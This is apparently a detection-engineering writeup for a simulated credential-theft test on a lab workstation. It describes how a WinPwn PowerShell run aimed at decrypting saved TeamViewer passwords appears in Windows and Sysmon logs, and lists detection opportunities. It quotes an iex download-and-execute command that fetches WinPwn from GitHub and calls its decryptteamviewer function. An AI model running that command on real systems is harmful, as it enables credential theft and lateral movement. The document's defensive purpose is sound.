# T1555-8: Credentials from Password Stores — WinPwn - Loot Local Credentials - Decrypt Teamviewer Passwords

## Technique Context

T1555 covers credential theft from password stores. This test uses the WinPwn framework's `decryptteamviewer` function to extract TeamViewer saved passwords from the Windows registry. TeamViewer stores its authentication credentials in `HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\TeamViewer` (or similar paths) using a weak, reversible encryption algorithm. The decryption key is publicly known, making automated recovery straightforward. Attackers target TeamViewer credentials to enable lateral movement — a compromised workstation with saved TeamViewer connections provides a ready-made remote access path to other machines in the network without deploying additional implants.

## What This Dataset Contains

The dataset spans approximately 8 seconds (2026-03-14T00:38:59Z – 00:39:07Z) on ACME-WS02.

**The attack command is visible in Security EID 4688 and PowerShell EID 4104:**

> `"powershell.exe" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')`
> `decryptteamviewer -consoleoutput -noninteractive}`

This is the same WinPwn URL and commit hash as T1555-6 and T1555-7, with `decryptteamviewer` as the module function.

**Windows Defender blocked the script.** PowerShell EID 4100:

> `This script contains malicious content and has been blocked by your antivirus software.`
> `Fully Qualified Error ID = ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand`

This dataset has one distinctive element not present in T1555-6 or T1555-7: **Sysmon EID 3 (Network Connection Detected)** records an actual outbound TCP connection:

> `Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`
> `Protocol: tcp`
> `SourceIp: 192.168.4.12, SourcePort: 50189`
> `DestinationIp: 185.199.111.133, DestinationPort: 443`

Tagged `technique_id=T1059.001,technique_name=PowerShell`. The TCP connection to the GitHub CDN on port 443 confirms that the HTTPS download of WinPwn.ps1 completed before AMSI blocked execution. Sysmon EID 22 also records the DNS query for `raw.githubusercontent.com`. The combination of DNS + network connection + AMSI block provides the most complete picture of the download-and-block lifecycle across the three WinPwn tests in this dataset series.

## What This Dataset Does Not Contain (and Why)

**TeamViewer registry access.** The `decryptteamviewer` function never executed. No Sysmon EID 13 events (registry value set) or registry read activity for TeamViewer paths are present. Registry reads are not logged in this environment regardless (object access auditing is disabled and Sysmon's registry monitoring is limited to writes in the current config).

**TeamViewer installation.** ACME-WS02 does not have TeamViewer installed. Even if WinPwn had executed, the registry keys would be absent and the function would return an empty result.

**EID 3 events in T1555-6 and T1555-7.** The network connection event appears in T1555-8's sysmon.jsonl but not in the T1555-6 or T1555-7 sysmon files. This reflects timing variation in Sysmon's network connection capture — the connection was made in all three cases (the AMSI block proves the download completed), but Sysmon only captured the outbound connection event in T1555-8.

## Assessment

This dataset is the third in the WinPwn series (T1555-6, T1555-7, T1555-8) and adds the `decryptteamviewer` module targeting application-stored credentials. The AMSI block outcome is identical to the prior two. The distinctive contribution of this dataset is the Sysmon EID 3 network connection record, which provides concrete evidence of the HTTPS connection to GitHub completing — grounding the download phase in network telemetry rather than inferring it from the AMSI block alone.

## Detection Opportunities Present in This Data

- **Security EID 4688**: Command line contains `decryptteamviewer -consoleoutput -noninteractive` and the WinPwn URL. The `decryptteamviewer` string identifies the specific credential target.
- **PowerShell EID 4104**: Scriptblock captures `{iex(...WinPwn.ps1') decryptteamviewer -consoleoutput -noninteractive}`.
- **Sysmon EID 3**: Outbound TCP connection from `powershell.exe` to 185.199.111.133:443 (raw.githubusercontent.com). Network connection event tagged T1059.001. This is the most concrete network-layer indicator: PowerShell initiating HTTPS connections to GitHub CDN addresses from a SYSTEM context.
- **Sysmon EID 22**: DNS query for `raw.githubusercontent.com` from PowerShell — consistent across all three WinPwn tests.
- **PowerShell EID 4100**: AMSI block fingerprint `ScriptContainedMaliciousContent,InvokeExpressionCommand`.
- **WinPwn series correlation**: EID 3 in T1555-8 combined with the DNS events in T1555-6 and T1555-7 provides a complete download lifecycle view across the WinPwn module invocations. A single rule detecting any PowerShell → `raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/` network activity would cover all three tests regardless of which module was invoked.
